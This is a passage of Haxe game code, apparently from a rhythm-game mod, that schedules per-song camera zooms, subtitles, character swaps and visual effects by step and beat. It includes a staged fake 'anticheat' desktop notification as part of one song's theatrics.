							defaultCamZoom -= 0.2;
							FlxTween.tween(black, {alpha: 0}, 1);

					}
			case 'polygonized':
				switch(curStep)
				{
					case 128 | 640 | 704 | 1535:
						defaultCamZoom = 0.9;
					case 256 | 768 | 1468 | 1596 | 2048 | 2144 | 2428:
						defaultCamZoom = 0.7;
					case 688 | 752 | 1279 | 1663 | 2176:
						defaultCamZoom = 1;
					case 1019 | 1471 | 1599 | 2064:
						defaultCamZoom = 0.8;
					case 1920:
						defaultCamZoom = 1.1;

					case 1024 | 1312:
						defaultCamZoom = 1.1;
						crazyZooming = true;

						if (localFunny != CharacterFunnyEffect.Recurser)
						{
							shakeCam = true;
							pre3dSkin = boyfriend.curCharacter;
							for (char in [boyfriend, gf])
							{
								if (char.skins.exists('3d'))
								{
									if (char == boyfriend)
									{
										switchBF(char.skins.get('3d'), char.getPosition());
									}
									else if (char == gf)
									{
										switchGF(char.skins.get('3d'), char.getPosition());
									}
								}
							}
						}
					case 1152 | 1408:
						defaultCamZoom = 0.9;
						shakeCam = false;
						crazyZooming = false;
						if (localFunny != CharacterFunnyEffect.Recurser)
						{
							if (boyfriend.curCharacter != pre3dSkin)
							{
								switchBF(pre3dSkin, boyfriend.getPosition());
								switchGF(boyfriend.skins.get('gfSkin'), gf.getPosition());
							}
						}
				}
			case 'adventure':
				switch (curStep)
				{
					case 1151:
						defaultCamZoom = 1;
					case 1407:
						defaultCamZoom = 0.8;	
				}
			case 'glitch':
				switch (curStep)
				{
					case 15:
						dad.playAnim('hey', true);
					case 16 | 719 | 1167:
						defaultCamZoom = 1;
					case 80 | 335 | 588 | 1103:
						defaultCamZoom = 0.8;
					case 584 | 1039:
						defaultCamZoom = 1.2;
					case 272 | 975:
						defaultCamZoom = 1.1;
					case 464:
						defaultCamZoom = 1;
						FlxTween.linearMotion(dad, dad.x, dad.y, 25, 50, 20, true);
					case 848:
						shakeCam = false;
						crazyZooming = false;
						defaultCamZoom = 1;
					case 132 | 612 | 740 | 771 | 836:
						shakeCam = true;
						crazyZooming = true;
						defaultCamZoom = 1.2;
					case 144 | 624 | 752 | 784:
						shakeCam = false;
						crazyZooming = false;
						defaultCamZoom = 0.8;
					case 1231:
						defaultCamZoom = 0.8;
						FlxTween.linearMotion(dad, dad.x, dad.y, 50, 280, 1, true);
				}
			case 'mealie':
				switch (curStep)
				{
					case 659:
						subtitleManager.addSubtitle(LanguageManager.getTextString('mealie_sub1'), 0.02, 0.6);
					case 1183:
						defaultCamZoom += 0.2;
						black = new FlxSprite().makeGraphic(FlxG.width * 2, FlxG.height * 2, FlxColor.BLACK);
						black.screenCenter();
						black.alpha = 0;
						add(black);
						FlxTween.tween(black, {alpha: 0.6}, 1);
						makeInvisibleNotes(true);
					case 1193:
						subtitleManager.addSubtitle(LanguageManager.getTextString('mealie_sub2'), 0.02, 0.6);
					case 1208:
						subtitleManager.addSubtitle(LanguageManager.getTextString('mealie_sub3'), 0.02, 1.5);
					case 1228:
						subtitleManager.addSubtitle(LanguageManager.getTextString('mealie_sub4'), 0.02, 1);
					case 1242:
						subtitleManager.addSubtitle(LanguageManager.getTextString('mealie_sub5'), 0.02, 1);
					case 1257:
						subtitleManager.addSubtitle(LanguageManager.getTextString('mealie_sub6'), 0.02, 0.5);
					case 1266:
						subtitleManager.addSubtitle(LanguageManager.getTextString('mealie_sub7'), 0.02, 1.5);
					case 1289:
						subtitleManager.addSubtitle(LanguageManager.getTextString('mealie_sub8'), 0.02, 2);
					case 1344:
						defaultCamZoom -= 0.2;
						FlxTween.tween(black, {alpha: 0}, 1);
						makeInvisibleNotes(false);
					case 1584:
						subtitleManager.addSubtitle(LanguageManager.getTextString('mealie_sub15'), 0.02, 1);
					case 1751:
						subtitleManager.addSubtitle(LanguageManager.getTextString('mealie_sub9'), 0.02, 0.6);
					case 1770:
						subtitleManager.addSubtitle(LanguageManager.getTextString('mealie_sub10'), 0.02, 0.6);
					case 1776:
						FlxG.camera.flash(FlxColor.WHITE, 0.25);
						switchDad(FlxG.random.int(0, 999) == 0 ? 'bambi-angey-old' : 'bambi-angey', dad.getPosition());
						dad.color = nightColor;
					case 1800:
						subtitleManager.addSubtitle(LanguageManager.getTextString('mealie_sub11'), 0.02, 0.6);
					case 1810:
						subtitleManager.addSubtitle(LanguageManager.getTextString('mealie_sub12'), 0.02, 0.6);
					case 1843:
						subtitleManager.addSubtitle(LanguageManager.getTextString('mealie_sub13'), 0.02, 1, {subtitleSize: 60});
					case 2418:
						subtitleManager.addSubtitle(LanguageManager.getTextString('mealie_sub14'), 0.02, 0.6);	
				}
			case 'indignancy':
				switch (curStep)
				{
					case 124 | 304 | 496 | 502 | 576 | 848:
						defaultCamZoom += 0.2;
					case 176:
						defaultCamZoom -= 0.2;
						crazyZooming = true;
					case 320 | 832 | 864:
						defaultCamZoom -= 0.2;
					case 508:
						defaultCamZoom -= 0.4;		
					case 320 | 864:
						crazyZooming = true;	
					case 304 | 832 | 1088 | 2144:
						crazyZooming = false;
					case 1216:
						defaultCamZoom += 0.2;
						black = new FlxSprite().makeGraphic(FlxG.width * 2, FlxG.height * 2, FlxColor.BLACK);
						black.screenCenter();
						black.alpha = 0;
						add(black);
						FlxTween.tween(black, {alpha: 0.6}, 1);
						makeInvisibleNotes(true);
					case 1217:
						subtitleManager.addSubtitle(LanguageManager.getTextString('indignancy_sub1'), 0.02, 2);
					case 1262:
						subtitleManager.addSubtitle(LanguageManager.getTextString('indignancy_sub2'), 0.02, 1.5);
					case 1292:
						subtitleManager.addSubtitle(LanguageManager.getTextString('indignancy_sub3'), 0.02, 1);
					case 1330:
						subtitleManager.addSubtitle(LanguageManager.getTextString('indignancy_sub4'), 0.02, 0.5);
				    case 1344:
						defaultCamZoom -= 0.2;
						FlxTween.tween(black, {alpha: 0}, 1);
						makeInvisibleNotes(false);
					case 1622:
						subtitleManager.addSubtitle(LanguageManager.getTextString('indignancy_sub5'), 0.02, 0.3);
						
						defaultCamZoom += 0.4;
						FlxG.camera.shake(0.015, 0.6);
						dad.canDance = false;
						dad.playAnim('scream', true);
						dad.animation.finishCallback = function(animation:String)
						{
							dad.canDance = true;
						}
					case 1632:
						defaultCamZoom -= 0.4;
						crazyZooming = true;
						FlxG.camera.flash(FlxColor.WHITE, 0.5);
				}
				switch (curBeat)
				{
					case 335:
						if (!spotLightPart)
						{
							spotLightPart = true;
							FlxG.camera.flash(FlxColor.WHITE, 0.5);
	
							spotLight = new FlxSprite().loadGraphic(Paths.image('spotLight'));
							spotLight.blend = BlendMode.ADD;
							spotLight.setGraphicSize(Std.int(spotLight.width * (dad.frameWidth / spotLight.width) * spotLightScaler));
							spotLight.updateHitbox();
							spotLight.alpha = 0;
							spotLight.origin.set(spotLight.origin.x,spotLight.origin.y - (spotLight.frameHeight / 2));
							add(spotLight);
		
							updateSpotlight(false);
							
							FlxTween.tween(black, {alpha: 0.6}, 1);
							FlxTween.tween(spotLight, {alpha: 1}, 1);
						}
					case 408:
						spotLightPart = false;
						FlxTween.tween(spotLight, {alpha: 0}, 1, {onComplete: function(tween:FlxTween)
						{
							remove(spotLight);
						}});
						FlxTween.tween(black, {alpha: 0}, 1);
				}
			case 'exploitation':
				switch(curStep)
				{
					case 12, 18, 23:
						blackScreen.alpha = 1;
						FlxTween.tween(blackScreen, {alpha: 0}, Conductor.crochet / 1000);
						FlxG.sound.play(Paths.sound('static'), 0.5);

						creditsPopup.switchHeading({path: 'songHeadings/glitchHeading', antiAliasing: false, animation: 
						new Animation('glitch', 'glitchHeading', 24, true, [false, false]), iconOffset: 0});
						
						creditsPopup.changeText('', 'none', false);
					case 20:
						creditsPopup.switchHeading({path: 'songHeadings/expungedHeading', antiAliasing: true,
						animation: new Animation('expunged', 'Expunged', 24, true, [false, false]), iconOffset: 0});

						creditsPopup.changeText('Song by Oxygen', 'Oxygen');
					case 14, 24:
						creditsPopup.switchHeading({path: 'songHeadings/expungedHeading', antiAliasing: true,
						animation: new Animation('expunged', 'Expunged', 24, true, [false, false]), iconOffset: 0});

						creditsPopup.changeText('Song by EXPUNGED', 'whoAreYou');
					case 32 | 512:
						FlxTween.tween(boyfriend, {alpha: 0}, 3);
						FlxTween.tween(gf, {alpha: 0}, 3);
						defaultCamZoom = FlxG.camera.zoom + 0.3;
						FlxTween.tween(FlxG.camera, {zoom: FlxG.camera.zoom + 0.3}, 4);
					case 128 | 576:
						defaultCamZoom = FlxG.camera.zoom - 0.3;
						FlxTween.tween(boyfriend, {alpha: 1}, 0.2);
						FlxTween.tween(gf, {alpha: 1}, 0.2);
						FlxTween.tween(FlxG.camera, {zoom: FlxG.camera.zoom - 0.3}, 0.05);
						mcStarted = true;

					case 184 | 824:
						FlxTween.tween(FlxG.camera, {angle: 10}, 0.1);
					case 188 | 828:
						FlxTween.tween(FlxG.camera, {angle: -10}, 0.1);
					case 192 | 832:
						FlxTween.tween(FlxG.camera, {angle: 0}, 0.2);
					case 1276:
						FlxG.camera.fade(FlxColor.WHITE, (Conductor.stepCrochet / 1000) * 4, false, function()
						{
							FlxG.camera.stopFX();
						});
						FlxG.camera.shake(0.015, (Conductor.stepCrochet / 1000) * 4);
					case 1280:
						shakeCam = true;
						FlxG.camera.zoom -= 0.2;

						windowProperties = [
							Application.current.window.x,
							Application.current.window.y,
							Application.current.window.width,
							Application.current.window.height
						];

						#if windows
						popupWindow();
						#end
						
						modchart = ExploitationModchartType.Figure8;
						dadStrums.forEach(function(strum:StrumNote)
						{
							strum.resetX();
						});
						playerStrums.forEach(function(strum:StrumNote)
						{
							strum.resetX();
						});

					case 1282:
						expungedBG.loadGraphic(Paths.image('backgrounds/void/exploit/broken_expunged_chain', 'shared'));
						expungedBG.setGraphicSize(Std.int(expungedBG.width * 2));
					case 1311:
						shakeCam = false;
						FlxG.camera.zoom += 0.2;	
					case 1343:
						shakeCam = true;
						FlxG.camera.zoom -= 0.2;	
					case 1375:
						shakeCam = false;
						FlxG.camera.zoom += 0.2;
					case 1487:
						shakeCam = true;
						FlxG.camera.zoom -= 0.2;
					case 1503:
						shakeCam = false;
						FlxG.camera.zoom += 0.2;
					case 1536:						
						expungedBG.loadGraphic(Paths.image('backgrounds/void/exploit/creepyRoom', 'shared'));
						expungedBG.setGraphicSize(Std.int(expungedBG.width * 2));
						expungedBG.setPosition(0, 200);
						
						modchart = ExploitationModchartType.Sex;
						dadStrums.forEach(function(strum:StrumNote)
						{
							strum.resetX();
						});
						playerStrums.forEach(function(strum:StrumNote)
						{
							strum.resetX();
						});

					case 2080:
						glitchText = false;
						#if windows
						if (window != null)
						{
							FlxTween.tween(expungedSpr, {alpha: 0}, 1, {ease: FlxEase.bounceOut, onComplete: function(tween:FlxTween)
							{
								closeExpungedWindow();
							}});
							FlxTween.tween(iconP2, {alpha: 0}, 1, {ease: FlxEase.bounceOut});
							FlxTween.tween(Application.current.window, {x: windowProperties[0], y: windowProperties[1], width: windowProperties[2], height: windowProperties[3]}, 1, {ease: FlxEase.circInOut});
						}
						#end
					case 2083:
						PlatformUtil.sendWindowsNotification("Anticheat.dll", "Threat expunged.dat successfully contained.");
				}
			case 'shredder':
				switch (curStep)
				{
					case 261:
						defaultCamZoom += 0.2;
						FlxG.camera.flash(FlxColor.WHITE, 0.5);
						black = new FlxSprite().makeGraphic(FlxG.width * 2, FlxG.height * 2, FlxColor.BLACK);
						black.screenCenter();
						black.scrollFactor.set();
						black.alpha = 0;
						add(black);
						FlxTween.tween(black, {alpha: 0.6}, 1);
						makeInvisibleNotes(true);
						subtitleManager.addSubtitle(LanguageManager.getTextString('shred_sub1'), 0.02, 0.3);
					case 273:
						subtitleManager.addSubtitle(LanguageManager.getTextString('shred_sub2'), 0.02, 0.6);
					case 296:
						subtitleManager.addSubtitle(LanguageManager.getTextString('shred_sub3'), 0.02, 0.6);
					case 325:
						subtitleManager.addSubtitle(LanguageManager.getTextString('shred_sub4'), 0.02, 0.6);
					case 342:
						subtitleManager.addSubtitle(LanguageManager.getTextString('shred_sub5'), 0.02, 0.6);
					case 356:
						subtitleManager.addSubtitle(LanguageManager.getTextString('shred_sub6'), 0.02, 0.6);
					case 361:
						subtitleManager.addSubtitle(LanguageManager.getTextString('shred_sub7'), 0.02, 0.6);
					case 384:
						subtitleManager.addSubtitle(LanguageManager.getTextString('shred_sub8'), 0.02, 0.6, {subtitleSize: 60});
					case 393:
						subtitleManager.addSubtitle(LanguageManager.getTextString('shred_sub9'), 0.02, 0.6, {subtitleSize: 60});
					case 408:
						subtitleManager.addSubtitle(LanguageManager.getTextString('shred_sub10'), 0.02, 0.6, {subtitleSize: 60});
					case 425:
						subtitleManager.addSubtitle(LanguageManager.getTextString('shred_sub11'), 0.02, 0.6, {subtitleSize: 60});
					case 484:
						subtitleManager.addSubtitle(LanguageManager.getTextString('shred_sub12'), 0.02, 0.6, {subtitleSize: 60});
					case 512:
						defaultCamZoom -= 0.2;
						FlxG.camera.flash();
						FlxTween.tween(black, {alpha: 0}, 1);
						makeInvisibleNotes(false);
					case 784 | 816 | 912 | 944:
						#if SHADERS_ENABLED
						camHUD.setFilters([new ShaderFilter(blockedShader.shader)]);
						#end
						defaultCamZoom += 0.2;
						FlxTween.tween(black, {alpha: 0.6}, 1);
					case 800 | 832 | 928:
						camHUD.setFilters([]);
						defaultCamZoom -= 0.2;
						FlxTween.tween(black, {alpha: 0}, 1);
					case 960:
						camHUD.setFilters([]);
						defaultCamZoom = 0.7;
						FlxTween.tween(black, {alpha: 0}, 1);
					case 992:
						dadStrums.forEach(function(spr:StrumNote)
						{
							FlxTween.tween(spr, {alpha: 0}, 1);
						});
					case 1008:
						switchDad('bambi-shredder', dad.getPosition());
						dad.playAnim('takeOut', true);

					case 1024:
						FlxG.camera.flash(FlxColor.WHITE, 0.5);

						playerStrums.forEach(function(spr:StrumNote)
						{
							FlxTween.cancelTweensOf(spr);
						});

						dadStrums.forEach(function(spr:StrumNote)
						{
							spr.alpha = 1;
						});
						
						lockCam = true;
						
						originalBFScale = boyfriend.scale.copyTo(originalBFScale);
						originBFPos = boyfriend.getPosition();
						originBambiPos = dad.getPosition();

						dad.cameras = [camHUD];
						dad.scrollFactor.set();
						dad.setPosition(71, 82);
						dad.setScale(dad.scale.x * 0.55, dad.scale.y * 0.55);
						dad.offsetScale = 0.55;
						
						bambiSpot = new FlxSprite(34, 151).loadGraphic(Paths.image('festival/shredder/bambi_spot'));
						bambiSpot.scrollFactor.set();
						bambiSpot.blend = BlendMode.ADD;
						bambiSpot.cameras = [camHUD];
						insert(members.indexOf(dadGroup), bambiSpot);

						bfSpot = new FlxSprite(995, 381).loadGraphic(Paths.image('festival/shredder/boyfriend_spot'));
						bfSpot.scrollFactor.set();
						bfSpot.blend = BlendMode.ADD;
						bfSpot.cameras = [camHUD];
						bfSpot.alpha = 0;

						boyfriend.cameras = [camHUD];
						boyfriend.setScale(boyfriend.scale.x * 0.45, boyfriend.scale.y * 0.45);
						boyfriend.offsetScale = 0.45;
						boyfriend.scrollFactor.set();
						boyfriend.setPosition((bfSpot.x - (boyfriend.width / 3.25)) + boyfriend.globalOffset[0] * boyfriend.offsetScale, (bfSpot.y - (boyfriend.height * 1.1)) + boyfriend.globalOffset[1] * boyfriend.offsetScale);
						boyfriend.alpha = 0;

						insert(members.indexOf(bfGroup), bfSpot);

						highway = new FlxSprite().loadGraphic(Paths.image('festival/shredder/ch_highway'));
						highway.setGraphicSize(Std.int(highway.width * (640 / highway.width)), Std.int(highway.height * (1280 / highway.height)));
						highway.updateHitbox();
						highway.cameras = [camHUD];
						highway.screenCenter();
						highway.scrollFactor.set();
						insert(members.indexOf(strumLineNotes), highway);
						
						highway2 = new FlxSprite().loadGraphic(Paths.image('festival/shredder/ch_highway'));
						highway2.setGraphicSize(Std.int(highway2.width * (640 / highway2.width)), Std.int(highway2.height * (1280 / highway2.height)));
						highway2.updateHitbox();
						highway2.cameras = [camHUD];
						highway2.screenCenter();
						highway2.scrollFactor.set();
						insert(members.indexOf(strumLineNotes), highway2);
						
						black = new FlxSprite().makeGraphic(2560, 1440, FlxColor.BLACK);
						black.screenCenter();
						black.scrollFactor.set();
						black.alpha = 0.9;
						insert(members.indexOf(highway), black);

						dadStrums.forEach(function(spr:StrumNote)
						{
							dadStrums.remove(spr);
							strumLineNotes.remove(spr);
							remove(spr);
						});
						generateGhNotes(0);
						
						dadStrums.forEach(function(spr:StrumNote)
						{
							spr.centerStrum();
							spr.x -= (spr.width / 4);
						});
						playerStrums.forEach(function(spr:StrumNote)
						{
							spr.centerStrum();
							spr.alpha = 0;
							spr.x -= (spr.width / 4);
						});
					case 1276:
						dadStrums.forEach(function(spr:StrumNote)
						{
							FlxTween.tween(spr, {alpha: 0}, (Conductor.stepCrochet / 1000) * 2);
						});
						playerStrums.forEach(function(spr:StrumNote)
						{
							FlxTween.tween(spr, {alpha: 1}, (Conductor.stepCrochet / 1000) * 2);
						});
					case 1280:
						FlxTween.tween(boyfriend, {alpha: 1}, 1);
						FlxTween.tween(bfSpot, {alpha: 1}, 1);
					case 1536:
						var blackFront = new FlxSprite(0, 0).makeGraphic(2560, 1440, FlxColor.BLACK);
						blackFront.screenCenter();
						blackFront.alpha = 0;
						blackFront.cameras = [camHUD];
						add(blackFront);
						FlxTween.tween(blackFront, {alpha: 1}, 0.5, {onComplete: function(tween:FlxTween)
						{
							lockCam = false;
							strumLineNotes.forEach(function(spr:StrumNote)
							{
								spr.x = spr.baseX;
							});
							switchDad('bambi-new', originBambiPos, false);

							boyfriend.cameras = dad.cameras;
							boyfriend.scale.set(originalBFScale.x, originalBFScale.y);
							boyfriend.updateHitbox();
							boyfriend.offsetScale = 1;
							boyfriend.scrollFactor.set(1, 1);
							boyfriend.setPosition(originBFPos.x, originBFPos.y);
							
							for (hudElement in [black, blackFront, bambiSpot, bfSpot, highway, highway2])
							{
								remove(hudElement);
							}
							FlxTween.tween(blackFront, {alpha: 0}, 0.5);
						}});
						regenerateStaticArrows(0);

						defaultCamZoom += 0.2;
						#if SHADERS_ENABLED
						if(CompatTool.save.data.compatMode != null && CompatTool.save.data.compatMode == false)
						{
							camHUD.setFilters([new ShaderFilter(blockedShader.shader)]);
						}
						#end
						FlxTween.tween(black, {alpha: 0.6}, 1);
						makeInvisibleNotes(true);
					case 1552:
						camHUD.setFilters([]);
						defaultCamZoom += 0.1;
					case 1568:
						#if SHADERS_ENABLED
						if(CompatTool.save.data.compatMode != null && CompatTool.save.data.compatMode == false)
							{
								camHUD.setFilters([new ShaderFilter(blockedShader.shader)]);
							}
						#end
						defaultCamZoom += 0.1;
					case 1584:
						camHUD.setFilters([]);
						defaultCamZoom += 0.1;
					case 1600:
						#if SHADERS_ENABLED
						if(CompatTool.save.data.compatMode != null && CompatTool.save.data.compatMode == false)
							{
								camHUD.setFilters([new ShaderFilter(blockedShader.shader)]);
							}
						#end
						defaultCamZoom += 0.1;
					case 1616:
						camHUD.setFilters([]);
						defaultCamZoom += 0.1;
					case 1632:
						#if SHADERS_ENABLED
						if(CompatTool.save.data.compatMode != null && CompatTool.save.data.compatMode == false)
							{
								camHUD.setFilters([new ShaderFilter(blockedShader.shader)]);
							}
						#end
						defaultCamZoom += 0.1;
					case 1648:
						FlxTween.tween(black, {alpha: 1}, 1);
						camHUD.setFilters([]);
						defaultCamZoom += 0.1;
					case 1664:
						defaultCamZoom -= 0.9;
						FlxG.camera.flash();
						FlxTween.tween(black, {alpha: 0}, 1);
						makeInvisibleNotes(false);
					case 1937:
						subtitleManager.addSubtitle(LanguageManager.getTextString('shred_sub13'), 0.02, 0.6, {subtitleSize: 60});
					case 1946:
						subtitleManager.addSubtitle(LanguageManager.getTextString('shred_sub14'), 0.02, 0.6, {subtitleSize: 60});
				}
			case 'rano':
				switch (curStep)
				{
					case 512:
						defaultCamZoom = 0.9;
					case 640:
						defaultCamZoom = 0.7;
					case 1792:
						dad.canDance = false;
						dad.canSing = false;
						dad.playAnim('sleepIdle', true);
						dad.animation.finishCallback = function(anim:String)
						{
							dad.playAnim('sleeping', true);
						}
				}
			case 'five-nights':
				if (!powerRanOut)
				{
					switch (curStep)
					{
						case 60:
							switchNoteSide();
						case 64 | 320 | 480 | 576 | 704 | 832 | 1024:
							nofriendAttack();
						case 992:
							defaultCamZoom = 1.2;
							FlxTween.tween(camHUD, {alpha: 0}, 1);
						case 1088:
							sixAM();
					}
				}
			case 'bot-trot':
				switch (curStep)
				{
					case 896:
						FlxG.camera.flash();
						FlxG.sound.play(Paths.sound('lightswitch'), 1);
						defaultCamZoom = 1.1;
						switchToNight();
					case 1151:
						defaultCamZoom = 0.8;
				}
			case 'supernovae':
				switch (curStep)
				{
					case 60:
						dad.playAnim('hey', true);
					case 64:
						defaultCamZoom = 1;
					case 192:
						defaultCamZoom = 0.9;
					case 320 | 768:
						defaultCamZoom = 1.1;
					case 444:
						defaultCamZoom = 0.6;
					case 448 | 960 | 1344:
						defaultCamZoom = 0.8;
					case 896 | 1152:
						defaultCamZoom = 1.2;
					case 1024:
						defaultCamZoom = 1;
						shakeCam = true;
						FlxTween.linearMotion(dad, dad.x, dad.y, 25, 50, 15, true);

					case 1280:
						FlxTween.linearMotion(dad, dad.x, dad.y, 50, 280, 0.6, true);
						shakeCam = false;
						defaultCamZoom = 1;
				}
			case 'master':
				switch (curStep)
				{
					case 128:
						defaultCamZoom = 0.7;
					case 252 | 512:
						defaultCamZoom = 0.4;
						shakeCam = false;
					case 256:
						defaultCamZoom = 0.8;
					case 380:
						defaultCamZoom = 0.5;
					case 384:
						defaultCamZoom = 1;
						shakeCam = true;
					case 508:
						defaultCamZoom = 1.2;
					case 560:
						dad.playAnim('die', true);			
						FlxG.sound.play(Paths.sound('dead'), 1);
					}
			case 'vs-dave-rap':
				switch(curStep)
				{
						case 64:
							FlxG.camera.flash();
						case 68:
							subtitleManager.addSubtitle(LanguageManager.getTextString('daverap_sub1'), 0.02, 1);
						case 92:
							subtitleManager.addSubtitle(LanguageManager.getTextString('daverap_sub2'), 0.02, 0.8);
						case 112:
							subtitleManager.addSubtitle(LanguageManager.getTextString('daverap_sub3'), 0.02, 0.8);
						case 124:
							subtitleManager.addSubtitle(LanguageManager.getTextString('daverap_sub4'), 0.02, 0.5);
						case 140:
							subtitleManager.addSubtitle(LanguageManager.getTextString('daverap_sub5'), 0.02, 0.5);
						case 150:
							subtitleManager.addSubtitle(LanguageManager.getTextString('daverap_sub6'), 0.02, 1);
						case 176:
							subtitleManager.addSubtitle(LanguageManager.getTextString('daverap_sub7'), 0.02, 0.5);
						case 184:
							subtitleManager.addSubtitle(LanguageManager.getTextString('daverap_sub8'), 0.02, 0.8);
						case 201:
							subtitleManager.addSubtitle(LanguageManager.getTextString('daverap_sub9'), 0.02, 0.5);
						case 211:
							subtitleManager.addSubtitle(LanguageManager.getTextString('daverap_sub10'), 0.02, 0.8);
						case 229:
							subtitleManager.addSubtitle(LanguageManager.getTextString('daverap_sub11'), 0.02, 0.5);
						case 241:
							subtitleManager.addSubtitle(LanguageManager.getTextString('daverap_sub12'), 0.02, 0.8);
						case 260:
							subtitleManager.addSubtitle(LanguageManager.getTextString('daverap_sub13'), 0.02, 0.8);
						case 281:
							subtitleManager.addSubtitle(LanguageManager.getTextString('daverap_sub14'), 0.02, 0.5);
						case 288:
							subtitleManager.addSubtitle(LanguageManager.getTextString('daverap_sub15'), 0.02, 1.5);
						case 322:
							FlxG.camera.flash();
					}
		    case 'vs-dave-rap-two':
				switch(curStep)
			    {
					case 62:
						FlxG.camera.flash();
						subtitleManager.addSubtitle(LanguageManager.getTextString('daveraptwo_sub1'), 0.02, 0.5);
					case 79:
						subtitleManager.addSubtitle(LanguageManager.getTextString('daveraptwo_sub2'), 0.02, 0.3);
					case 88:
						subtitleManager.addSubtitle(LanguageManager.getTextString('daveraptwo_sub3'), 0.02, 1.5);
					case 112:
						subtitleManager.addSubtitle(LanguageManager.getTextString('daveraptwo_sub4'), 0.02, 1.5);
					case 140:
						subtitleManager.addSubtitle(LanguageManager.getTextString('daveraptwo_sub5'), 0.02, 1);
					case 168:
						subtitleManager.addSubtitle(LanguageManager.getTextString('daveraptwo_sub6'), 0.02, 0.7);
					case 179:
						subtitleManager.addSubtitle(LanguageManager.getTextString('daveraptwo_sub7'), 0.02, 0.7);
					case 194:
						subtitleManager.addSubtitle(LanguageManager.getTextString('daveraptwo_sub8'), 0.02, 1.5);
					case 222:
						subtitleManager.addSubtitle(LanguageManager.getTextString('daveraptwo_sub9'), 0.02, 2);
					case 256:
						subtitleManager.addSubtitle(LanguageManager.getTextString('daveraptwo_sub10'), 0.02, 2);	
					case 291:
						subtitleManager.addSubtitle(LanguageManager.getTextString('daveraptwo_sub11'), 0.02, 1);
					case 342:
						subtitleManager.addSubtitle(LanguageManager.getTextString('daveraptwo_sub12'), 0.02, 1);
					case 351:
						FlxG.camera.flash();
				}
			case 'memory':
				switch (curStep)
				{
					case 1408:
						defaultCamZoom += 0.2;
						black = new FlxSprite().makeGraphic(FlxG.width * 2, FlxG.height * 2, FlxColor.BLACK);
						black.screenCenter();
						black.alpha = 0;
						add(black);
						FlxTween.tween(black, {alpha: 0.6}, 1);
						makeInvisibleNotes(true);
					case 1422:
						subtitleManager.addSubtitle(LanguageManager.getTextString('memory_sub1'), 0.02, 0.5);
					case 1436:
						subtitleManager.addSubtitle(LanguageManager.getTextString('memory_sub2'), 0.02, 1);
					case 1458:
						subtitleManager.addSubtitle(LanguageManager.getTextString('memory_sub3'), 0.02, 0.7);
					case 1476:
						subtitleManager.addSubtitle(LanguageManager.getTextString('memory_sub4'), 0.02, 1);
					case 1508:
						subtitleManager.addSubtitle(LanguageManager.getTextString('memory_sub5'), 0.02, 1.5);
					case 1541:
						subtitleManager.addSubtitle(LanguageManager.getTextString('memory_sub6'), 0.02, 1);
					case 1561:
						subtitleManager.addSubtitle(LanguageManager.getTextString('memory_sub7'), 0.02, 1);
					case 1583:
						subtitleManager.addSubtitle(LanguageManager.getTextString('memory_sub8'), 0.02, 0.8);
					case 1608:
						defaultCamZoom -= 0.2;
						FlxTween.tween(black, {alpha: 0}, 1);
						makeInvisibleNotes(false);
						subtitleManager.addSubtitle(LanguageManager.getTextString('memory_sub9'), 0.02, 1);
					case 1632:
						subtitleManager.addSubtitle(LanguageManager.getTextString('memory_sub10'), 0.02, 0.5);
					case 1646:
						defaultCamZoom += 0.2;
						black = new FlxSprite().makeGraphic(FlxG.width * 2, FlxG.height * 2, FlxColor.BLACK);
						black.screenCenter();
						black.alpha = 0;
						add(black);
						FlxTween.tween(black, {alpha: 0.6}, 1);
						makeInvisibleNotes(true);
						subtitleManager.addSubtitle(LanguageManager.getTextString('memory_sub11'), 0.02, 1);
					case 1664:
						defaultCamZoom -= 0.2;
						FlxTween.tween(black, {alpha: 0}, 1);
						makeInvisibleNotes(false);
				}
		}
		if (SONG.song.toLowerCase() == 'exploitation' && curStep % 8 == 0)
		{
			var fonts = ['arial', 'chalktastic', 'openSans', 'pkmndp', 'barcode', 'vcr'];
			var chosenFont = fonts[FlxG.random.int(0, fonts.length)];
			kadeEngineWatermark.font = Paths.font('exploit/${chosenFont}.ttf');
			creditsWatermark.font = Paths.font('exploit/${chosenFont}.ttf');
			scoreTxt.font = Paths.font('exploit/${chosenFont}.ttf');
			if (songName != null)
			{
				songName.font = Paths.font('exploit/${chosenFont}.ttf');
			}
		}
		#if desktop
		DiscordClient.changePresence(detailsText
			+ " "
			+ SONG.song
			+ " ("
			+ storyDifficultyText
			+ ") ",
			"Acc: "
			+ truncateFloat(accuracy, 2)
			+ "% | Score: "
			+ songScore
			+ " | Misses: "
			+ misses, iconRPC, true,
			FlxG.sound.music.length
			- Conductor.songPosition);
		#end
	}

	override function beatHit()
	{
		super.beatHit();

		if (spotLightPart && spotLight != null && spotLight.exists && curBeat % 3 == 0)
		{
			FlxTween.cancelTweensOf(spotLight);
			if (spotLight.health != 3)
			{
				FlxTween.tween(spotLight, {angle: 2}, (Conductor.crochet / 1000) * 3, {ease: FlxEase.expoInOut});
				spotLight.health = 3;
			}
			else
			{
				FlxTween.tween(spotLight, {angle: -2}, (Conductor.crochet / 1000) * 3, {ease: FlxEase.expoInOut});
				spotLight.health = 1;
			}
		}

		var currentSection = SONG.notes[Std.int(curStep / 16)];
		if (!UsingNewCam)
		{
			if (generatedMusic && currentSection != null)
			{
				if (curBeat % 4 == 0)
				{
					// trace(currentSection.mustHitSection);
				}

				focusOnDadGlobal = !currentSection.mustHitSection;
				ZoomCam(!currentSection.mustHitSection);
			}
		}
		if (generatedMusic)
		{
			notes.sort(FlxSort.byY, FlxSort.DESCENDING);
		}

		if (currentSection != null)
		{
			if (currentSection.changeBPM)
			{
				Conductor.changeBPM(currentSection.bpm);
				FlxG.log.add('CHANGED BPM!');
			}
			// else
			// Conductor.changeBPM(SONG.bpm);
		}
		if (dad.animation.finished)
		{
			switch (SONG.song.toLowerCase())
			{
				case 'warmup':
					dad.dance();
					if (dadmirror != null)
					{
						dadmirror.dance();
					}
				default:
					if (dad.holdTimer <= 0 && curBeat % 2 == 0)
					{
						dad.dance();
						if (dadmirror != null)
						{
							dadmirror.dance();
						}

						dadNoteCamOffset[0] = 0;
						dadNoteCamOffset[1] = 0;
					}
			}
		}

		// FlxG.log.add('change bpm' + SONG.notes[Std.int(curStep / 16)].changeBPM);
		#if SHADERS_ENABLED
		wiggleShit.update(Conductor.crochet);
		#end
		
		if (curBeat % gfSpeed == 0)
		{
			if (!shakeCam && gf.canDance)
			{
				gf.dance();
			}
		}

		if ((camZooming && curBeat % 4 == 0) || crazyZooming)
		{
			FlxG.camera.zoom += 0.015;
			camHUD.zoom += 0.03;
		}
		if (curBeat % 4 == 0 && SONG.song.toLowerCase() == 'recursed')
		{
			freeplayBG.alpha = 0.8;
